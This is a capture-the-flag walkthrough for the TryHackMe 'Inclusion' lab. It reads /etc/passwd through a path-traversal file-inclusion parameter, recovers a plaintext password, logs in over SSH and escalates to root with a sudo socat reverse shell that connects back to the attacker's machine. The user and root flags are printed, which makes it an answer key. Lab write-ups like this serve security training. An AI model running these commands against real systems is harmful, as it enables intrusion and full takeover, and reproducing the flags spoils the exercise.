# LFI Walkthrough
### Link
- https://tryhackme.com/room/inclusion
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-23 06:53 EST
Nmap scan report for 10.10.79.52
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Let's check the link http://[IP]. We access to a blog. (looks like a standard blog, build recently with few contents). If we click on any link, we arrive to an article but the most interesting part is the URL
```
http://10.10.79.52/article?name=hacking
```
This URL gives us an interesting information. **name** is a parameter and every time we click on the link to access this page, a call is done on this paramter.That indicates us we can move forward with File Inclusion attack.

Let's try to check **/etc/passwd/**
```
http://[IP]/article?name=/etc/passwd/
```
We arrive to an error page. We need to navigate to the file
```
http://[IP]/article?name=../../../../../../etc/passwd
```
Result
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 
```
We found the user **falconfeast** and it password **rootpassword**

---
### Exploitation

Let's SSH the server
```
falconfeast@10.10.79.52's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 23 17:35:52 IST 2022

  System load:  0.08              Processes:           86
  Usage of /:   34.8% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.79.52
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ ls -l
total 8
drwxr-xr-x 2 root        root        4096 Jan 21  2020 articles
-rw-r--r-- 1 falconfeast falconfeast   21 Jan 22  2020 user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799
```
**Question**
#### user flag?
**Answer** 
#### 60989655118397345799
---
### Privilege Escalation

Let's check **sudo -l** with the current user
```
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```
Check [gtfobins](https://gtfobins.github.io/gtfobins/socat/).

I tried the first pattern for [Shell](https://gtfobins.github.io/gtfobins/socat/#shell) but didn't work. 

- First: on the local machine, start the listener
```
socat file:`tty`,raw,echo=0 tcp-listen:4646
```
- Second: on the targeted machine, execute these command [ReverseShell](https://gtfobins.github.io/gtfobins/socat/#reverse-shell)
```
falconfeast@inclusion:~$ RHOST=[IP local machine]
falconfeast@inclusion:~$ RPORT=4646
falconfeast@inclusion:~$ sudo socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```
- Third: Local machine listener
```
sudo socat file:`tty`,raw,echo=0 tcp-listen:4646
Password:
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls -l
total 4
-rw-r--r-- 1 root root 21 Jan 22  2020 root.txt
# cat root.txt
42964104845495153909
```
**Question**
#### root flag?
**Answer** 
#### 42964104845495153909